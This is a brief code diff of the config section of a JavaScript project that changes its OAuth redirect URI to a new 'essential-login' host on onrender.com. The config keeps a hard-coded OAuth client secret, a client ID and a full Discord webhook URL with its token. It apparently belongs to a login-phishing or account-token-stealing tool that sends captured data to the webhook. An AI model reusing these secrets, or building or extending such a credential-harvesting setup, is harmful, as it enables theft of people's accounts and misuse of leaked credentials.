@@ -1,7 +1,7 @@
 //Config
 const client_secret = 'Y-H8Q~Bc30wOGVFtp~aVFuCkBpUWprLGoSXIhcWq'
 const client_id = '9e4bc979-2944-43b0-a360-c3234a0122df'
-const redirect_uri = 'https://essential-login-le7b.onrender.com'
+const redirect_uri = 'https://essential-login-o5ih.onrender.com'
 const webhook_url = 'https://discord.com/api/webhooks/1062163057964494909/ht6DYvvw_Av8K3hw0nvvRWwRRbO8DobSKh1K-4fzTykxScRHM4wP67UdMN9w59eRlsmp'
 //Requirements
 const axios = require('axios')
